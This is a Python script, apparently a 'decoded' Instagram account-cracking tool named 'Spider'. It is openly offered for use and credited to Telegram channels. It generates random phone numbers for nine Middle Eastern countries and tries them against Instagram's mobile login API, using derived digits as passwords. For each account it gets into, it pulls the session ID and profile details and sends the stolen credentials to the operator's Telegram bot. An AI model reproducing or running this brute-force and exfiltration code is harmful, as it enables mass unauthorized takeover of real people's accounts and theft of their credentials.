# encoding: utf-8
# Decoded by Sami
# Copyright: MR SAMI
# Follow us on telegram ( @TYG_TEAM )

hkh = ' @spider_tech_tool '
hk = 'Spider'
import os
try:
    import string
except:
    os.system('pip install string')
try:
    import requests
except:
    os.system('pip install requests')
try:
    import sys
except:
    os.system('pip install sys')
try:
    import pyfiglet
except:
    os.system('pip install pyfiglet')
try:
    import random
except:
    os.system('pip install random')
try:
    import colorama
except:
    os.system('pip install colorama')
try:
    import secrets
except:
    os.system('pip install secrets')
try:
    import uuid
except:
    os.system('pip install uuid')
try:
    import user_agent
except:
    os.system('pip install user_agent')
import time
from user_agent import generate_user_agent
from uuid import uuid4
from secrets import token_hex
chk = requests.get("https://raw.githubusercontent.com/mr-sami-x/Spider/main/Spider.txt").text
if  chk ==  'Mr-Sami':
    print("Sorry Stop Tool")
    exit()

user = '0987654321'
adv = 0
nadv = 0
skeu = 0
Z = '[2;31m'
G = '[1;32m'
E = '[1;31m'
S = '[1;33m'
Z = '[1;31m' #احمر
X = '[1;33m' #اصفر
Z1 = '[2;31m' #احمر_ثاني
F = '[2;32m' #اخضر
F1 = '[1;32m' #اخضر_ثاني
A = '[2;34m'#ازرق
A1 = '[2;34m'#ازرق_ثاني
C = '[2;35m' #وردي
C1 = '[1;35m' #وردي_ثاني
B = '[2;36m'#سمائي
Y = '[1;34m' #ازرق_فاتح
logo = pyfiglet.figlet_format(hk)
def slow(M):
    for c in M + '':
            sys.stdout.write(c)
            sys.stdout.flush()
            time.sleep(1. / 70)
slow(Z+logo+f'{B}   DEV{B} By {S}~{B} {hkh}')
slow(f'''
{B}----------------------
{C}[1]{B} - Saudi Arabia .
{F}[2]{C} - Egypt .
{A}[3]{F} - Iran .
{B}[4]{A} - Iraq .
{F}[5]{C} - Syria .
{A}[6]{F} - Turkey .
{C}[7]{B} - Lebanon .
{B}[8]{A} - Emirates .
{B}[9]{A} - Yemen .
{B}----------------------
''')
what = input(f"{S}[+]{F} Choose what you want :{Z} ")
print(f"{B}----------------------")
token = input('Enter Token : ')
ID = input('Enter ID : ')
print(f"{B}----------------------")
start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=wait a few seconds...🔥 ").json()
id_msg = start_msg['result']['message_id']
while True:
    if what == '1':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+9665' + us
        password = '05' + us
    if what == '2':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+2012' + us
        password = '012' + us
    if what == '3':
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+98093' + us
        password = '093' + us
    if what == '4':
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '964780' + us
        password = '0780' + us
    if what == '7':#لبنان
        us = str(''.join((random.choice(user) for i in range(6))))
        username = '+96176' + us
        password = '76' + us
    if what == '5':#سوريا
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+9639' + us
        password = '09' + us
    if what == '6':#تركيا
        us = str(''.join((random.choice(user) for i in range(7))))
        username = '+90531' + us
        password = '0531' + us
    if what == '8':#الإمارات
        us = str(''.join((random.choice(user) for i in range(8))))
        username = '+9715' + us
        password = '05' + us
    if what == '9':#اليمن
        us = str(''.join((random.choice(user) for i in range(9))))
        username = '+96777' + us
        password = '077' + us
    r = requests.Session()
    url = 'https://i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Y6 2019 pream; angler; angler; en_US)',
             'Accept':'*/*',
             'Cookie':'missing',
             'Accept-Encoding':'gzip, deflate',
             'Accept-Language':'en-US',
             'X-IG-Capabilities':'3brTvw==',
             'X-IG-Connection-Type':'WIFI',
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
             'Host':'i.instagram.com'}
    uid = str(uuid4())
    data = {'uuid':uid,
             'password':password,
             'username':username,
             'device_id':uid,
             'from_reg':'false',
             '_csrftoken':'missing',
             'login_attempt_countn':'0'}
    re = r.post(url, headers=headers, data=data, allow_redirects=True)
    if 'logged_in_user' in re.text:
            userQ = re.json()['logged_in_user']['username']
            sessd=re.cookies['sessionid']
            id = sessd.split('%')[0]
            urll = f'https://echoar.ml/Apimedia/infon.php?user={userQ}'
            regg = requests.get(urll)
            relo = regg.json()
            post = relo['Info']['Posts']
            try:
                cookie = secrets.token_hex(8)*2
                head = {
        'HOST': "www.instagram.com",
        'KeepAlive' : 'True',
        'user-agent' : "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36",
        'Cookie': 'cookie',
        'Accept' : "*/*",
        'ContentType' : "application/x-www-form-urlencoded",
        "X-Requested-With" : "XMLHttpRequest",
        "X-IG-App-ID": "936619743392459",
        "X-Instagram-AJAX" : "missing",
        "X-CSRFToken" : "missing",
        "Accept-Language" : "en-US,en;q=0.9"
                }
                url_id = f'https://www.instagram.com/{userQ}/?__a=1'
                req_id= requests.get(url_id,headers=head).json()
                name    = str(req_id['graphql']['user']['full_name'])
                fow    = str(req_id['graphql']['user']['edge_followed_by']['count'])
                foll    = str(req_id['graphql']['user']['edge_follow']['count'])
                isp    = str(req_id['graphql']['user']['is_private'])
                bio    = str(req_id['graphql']['user']['biography'])
                reo = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
                reepo = reo.json()
                dat = reepo['data']
                adv+=1
                print(G+f'''𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 𝙷𝚊𝚌𝚔𝚎𝚍 🕷️🕸️
•-----------------------------------•
 Ξ 𝙽𝚊𝚖𝚎 : {name}
 Ξ 𝚄𝚜𝚎𝚛 : {userQ}
 Ξ 𝙿𝚊𝚜𝚜 : {password}
 Ξ 𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 : {fow}
 Ξ 𝙵𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 : {foll}
 Ξ 𝙿𝚘𝚜𝚝𝚜 : {post}
 Ξ 𝙳𝚊𝚝𝚎 : {dat}
 Ξ 𝙸𝚍 : {id}
 Ξ 𝙱𝚒𝚘 : {bio}
 Ξ 𝚑𝚞𝚗𝚝 𝚗𝚞𝚖𝚋𝚎𝚛 ﴾{adv}﴿
•-----------------------------------•
• 𝙳𝚎𝚟 𓆩 {hkh} 𓆪''')
                requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=          𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 𝙷𝚊𝚌𝚔𝚎𝚍 🕷️🕸️
•-------------------------------------------------•
 Ξ 𝙽𝚊𝚖𝚎 : {name}
 Ξ 𝚄𝚜𝚎𝚛 : {userQ}
 Ξ 𝙿𝚊𝚜𝚜 : {password}
 Ξ 𝙵𝚘𝚕𝚕𝚘𝚠𝚎𝚛𝚜 : {fow}
 Ξ 𝙵𝚘𝚕𝚕𝚘𝚠𝚒𝚗𝚐 : {foll}
 Ξ 𝙿𝚘𝚜𝚝𝚜 : {post}
 Ξ 𝙳𝚊𝚝𝚎 : {dat}
 Ξ 𝙸𝚍 : {id}
 Ξ 𝙱𝚒𝚘 : {bio}
 Ξ 𝚑𝚞𝚗𝚝 𝚗𝚞𝚖𝚋𝚎𝚛 ﴾{adv}﴿
•-------------------------------------------------•
• 𝙳𝚎𝚟 𓆩 {hkh} 𓆪''')
            except:
                adv+=1
                print(G + 'USERNAME > ' + username + ' | PASSWORD > ' + password)
                requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=𝙽𝚎𝚠 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 𝙷𝚊𝚌𝚔𝚎𝚍 🕷️🕸️
•-------------------------------------------------•
 Ξ 𝚄𝚜𝚎𝚛 : {userQ}
 Ξ 𝙿𝚊𝚜𝚜 : {password}
 Ξ 𝚑𝚞𝚗𝚝 𝚗𝚞𝚖𝚋𝚎𝚛 ﴾{adv}﴿
•-------------------------------------------------•
• 𝙳𝚎𝚟 𓆩 {hkh} 𓆪''')
    elif '"message":"challenge_required","challenge"' in re.text:
                skeu+=1
                print(S + 'USERNAME > ' + username + ' | PASSWORD > ' + password)
                requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=𝙸𝚝𝚜 𝙰 𝚂𝚎𝚌𝚞𝚛𝚎 𝙰𝚌𝚌𝚘𝚞𝚗𝚝 🔐
•-------------------------------------------------•
 Ξ 𝚄𝚜𝚎𝚛 : {username}
 Ξ 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 : {password}
•-------------------------------------------------•
• 𝙳𝚎𝚟 𓆩 {hkh} 𓆪''')
    else:
                requests.post(f'''https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=• 𝒔𝒕𝒂𝒓𝒕 𝒔𝒆𝒂𝒓𝒄𝒉 𝒃𝒚 𓆩{hk}𓆪🔎💻
•- - - - - - - - - - - - - - - - - - - - - - - - - - - -•

- 𝒂𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 ﴾{adv}﴿ ⚡

- 𝒖𝒏𝒂𝒗𝒂𝒊𝒍𝒂𝒃𝒍𝒆 ﴾{nadv}﴿ 🔗

- 𝒔𝒆𝒄𝒖𝒓𝒆 ﴾{skeu}﴿ 🔐

- 𝒄𝒉𝒆𝒄𝒌 ﴾{username}﴿ 🕵🏻‍♂️

•- - - - - - - - - - - - - - - - - - - - - - - - - - - -•
• 𝒅𝒆𝒗 𓆩 {hkh} 𓆪''')
                print(E + 'USERNAME > ' + username + ' | PASSWORD > ' + password)
                nadv+= 1
